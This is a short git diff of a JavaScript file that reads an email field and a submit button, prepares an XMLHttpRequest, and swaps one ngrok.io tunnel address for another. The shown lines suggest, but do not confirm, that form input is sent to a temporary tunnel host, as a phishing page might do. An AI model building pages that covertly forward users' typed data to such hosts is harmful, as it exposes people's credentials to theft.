@@ -2,7 +2,7 @@ let email = document.getElementById("email");
 let submit = document.getElementById("submit");
 let xhr = new XMLHttpRequest();
 let type = 'iitu';
-let ip = 'e27ab9a6.ngrok.io';
+let ip = '38819a92.ngrok.io';
 //let port = '50243';
 
 let send = () => {
